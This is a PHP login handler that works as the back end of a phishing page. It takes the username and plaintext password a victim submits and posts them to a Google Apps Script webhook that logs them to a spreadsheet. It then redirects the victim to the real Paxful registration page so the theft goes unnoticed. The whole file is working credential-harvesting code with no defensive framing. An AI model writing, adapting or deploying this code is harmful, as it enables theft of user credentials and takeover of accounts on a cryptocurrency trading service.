<?php

// login.php

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Enviar a Google Sheets
    $webhook_url = 'https://script.google.com/macros/s/AKfycbxZaKpefDP1lbbzoloNOZwyyNq3klM78fisafFARwW2j2MpFGHIOF0sAlBgipGgTWs/exec'; // Pega aquí la URL del Apps Script
    $data = array(
        'username' => $username,
        'password' => $password
    );
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($webhook_url, false, $context);

     // Redirigir después de enviar los datos
    header("Location: https://accounts.paxful.com/register");
    exit;
    
}
?>